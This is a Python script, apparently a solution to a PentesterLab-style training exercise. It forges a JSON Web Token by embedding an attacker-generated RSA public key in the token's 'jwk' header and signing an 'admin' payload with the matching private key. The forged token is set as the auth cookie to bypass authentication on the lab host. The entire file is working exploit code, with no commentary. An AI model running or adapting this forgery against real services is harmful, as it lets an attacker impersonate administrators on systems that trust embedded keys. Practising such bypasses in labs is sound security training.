import requests
import json
import base64

from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256

key = RSA.generate(2048)

binPrivKey = key.exportKey('DER')
binPubKey =  key.publickey().exportKey('DER')

privkey = RSA.importKey(binPrivKey)
pubkey =  RSA.importKey(binPubKey)

n = pubkey.n
e = pubkey.e

data = {
	'username' : 'abcd',
	'password' : 'abcd'
}

url = 'http://ptl-24c7906a-c71cf734.libcurl.so/'

session = requests.Session()
r = session.post(url+'login', data=data)

header = {
  "alg":"RS256",
  "jwk":  {
          "kty":"RSA",
          "kid":"blahblah",
          "use":"sig",
          "n":base64.urlsafe_b64encode(n.to_bytes(n.bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('='),
          "e":base64.urlsafe_b64encode(e.to_bytes(e.bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('=')
          }
}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode('utf-8').rstrip('=')
payload = base64.urlsafe_b64encode(b'admin').decode('utf-8').rstrip('=')

h = SHA256.new((header_b64+'.'+payload).encode('utf-8'))
signature = PKCS1_v1_5.new(privkey).sign(h)


signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')

session.cookies['auth'] = requests.utils.quote(header_b64+'.'+payload+'.'+signature_b64)

s = session.get(url)
print(s.text)

